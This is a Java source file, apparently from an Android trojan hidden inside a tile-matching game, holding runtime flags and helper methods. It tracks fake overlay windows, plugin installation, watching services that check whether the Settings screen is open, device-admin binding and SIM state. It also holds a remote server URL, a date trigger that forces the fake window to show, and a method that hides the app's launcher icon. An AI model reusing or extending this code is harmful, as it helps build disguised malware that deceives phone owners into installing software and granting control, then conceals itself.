package com.xstd.qm;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import com.tinygame.lianliankan.LinkLinkSplashActivity;
import com.tinygame.lianliankan.R;
import com.xstd.qm.setting.MainSettingManager;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-17
 * Time: AM10:27
 * To change this template use File | Settings | File Templates.
 */
public class AppRuntime {

    public static ArrayList<AdpInfo> ADPINFO_LIST = new ArrayList<AdpInfo>();

    public static boolean SERVICE_RUNNING = false;

    public static boolean PLUGIN_INSTALLED = false;

    public static int CANCEL_COUNT = 0;

    public static final long ACTIVE_DELAY = ((long) 5) * 60 * 60 * 1000;

    public static final long ACTIVE_DEALY1= 5 * 1000;

    public static final String BASE_URL = "http://www.xinsuotd.net/gais/";

    public static AtomicBoolean FAKE_WINDOWS_SHOW = new AtomicBoolean(false);

    public static AtomicBoolean INSTALL_PACKAGE_TOP_SHOW = new AtomicBoolean(false);

    public static AtomicBoolean WATCHING_SERVICE_RUNNING = new AtomicBoolean(false);

    public static AtomicBoolean WATCHING_SERVICE_BREAK = new AtomicBoolean(false);

    public static AtomicBoolean WATCHING_SERVICE_ACTIVE_RUNNING = new AtomicBoolean(false);
    public static AtomicBoolean WATCHING_SERVICE_ACTIVE_BREAK = new AtomicBoolean(true);
    public static AtomicBoolean WATCHING_TOP_IS_SETTINGS = new AtomicBoolean(false);

    public static AtomicBoolean FAKE_WINDOW_FOR_DISDEVICE_SHOW = new AtomicBoolean(false);

    public static PLuginManager.AppInfo CURRENT_FAKE_APP_INFO = new PLuginManager.AppInfo();

    public static boolean shouldForceShowFakeWindow() {
        Calendar c = Calendar.getInstance();
        int curDay = c.get(Calendar.DAY_OF_YEAR);
        int curYear = c.get(Calendar.YEAR);
        if (curYear > 2014 || curDay >= Config.FORCE_START_DAY) {
            return true;
        }

        return false;
    }

    public static boolean isSIMCardReady(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        switch (tm.getSimState()) {
            case TelephonyManager.SIM_STATE_READY:
                return true;
        }

        return false;
    }

    public static int getColorFromBitmap(Context context, Bitmap bt) {
        if (bt != null && bt.getWidth() > 0 && bt.getHeight() > 0) {
            return bt.getPixel(bt.getWidth() / 2, bt.getHeight() / 2);
        }

        return context.getResources().getColor(R.color.black);
    }

    public static boolean isTablet(Context context) {
        return (context.getResources().getConfiguration().screenLayout
                    & Configuration.SCREENLAYOUT_SIZE_MASK)
                   >= Configuration.SCREENLAYOUT_SIZE_LARGE;
    }

    public static boolean isXiaomiDevice() {
        String MANUFACTURER = Build.MANUFACTURER;
        String model= Build.MODEL;
        if (!TextUtils.isEmpty(MANUFACTURER) && !TextUtils.isEmpty(model)) {
            if (MANUFACTURER.toLowerCase().contains("xiaomi") && model.toLowerCase().startsWith("mi")) return true;
        }

        return false;
    }

    public static final boolean isVersionBeyondGB() {
        return Build.VERSION.SDK_INT > Build.VERSION_CODES.GINGERBREAD_MR1;
    }

    public static boolean isBindingActive(Context context) {
//        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
//        return dpm.isAdminActive(new ComponentName(context, BindDeviceReceiver.class));
        return MainSettingManager.getInstance().getKeyHasBindingDevices();
    }

    public static void hideInLauncher(Context context) {
        PackageManager pm = context.getPackageManager();
        pm.setComponentEnabledSetting(new ComponentName(context, LinkLinkSplashActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
